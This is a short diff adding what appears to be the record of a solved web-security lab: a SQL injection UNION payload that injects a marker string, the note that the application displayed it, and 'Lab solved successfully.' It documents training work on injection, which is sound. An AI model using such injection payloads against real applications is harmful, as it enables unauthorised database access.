@@ -1,0 +1,11 @@
+HTTP/2 200 OK
+
+Payload
+
+' UNION SELECT NULL,'YUz0R9',NULL--
+
+Result
+
+The application displayed the supplied random string.
+
+Lab solved successfully.
